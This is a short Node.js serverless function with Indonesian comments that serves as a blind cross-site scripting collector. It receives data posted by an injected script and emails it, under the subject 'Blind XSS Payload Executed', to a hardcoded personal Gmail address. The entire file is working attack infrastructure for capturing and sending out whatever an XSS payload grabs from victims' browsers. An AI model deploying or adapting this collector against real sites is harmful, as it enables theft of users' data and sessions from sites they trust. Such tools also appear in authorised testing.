const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: 'Method Not Allowed',
        };
    }

    const data = JSON.parse(event.body);
    console.log('Received data:', data);

    // Konfigurasi transporter Gmail menggunakan environment variables
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.GMAIL_USER, // Mengambil email dari environment variable
            pass: process.env.GMAIL_PASSWORD, // Mengambil password dari environment variable
        },
    });

    // Kirim email
    const mailOptions = {
        from: process.env.GMAIL_USER, // Email pengirim
        to: 'gerhanagulita@gmail.com', // Email tujuan
        subject: 'Blind XSS Payload Executed',
        text: `Blind XSS payload executed. Data: ${JSON.stringify(data, null, 2)}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Email sent');
    } catch (error) {
        console.error('Error sending email:', error);
    }

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Data received and email sent' }),
    };
};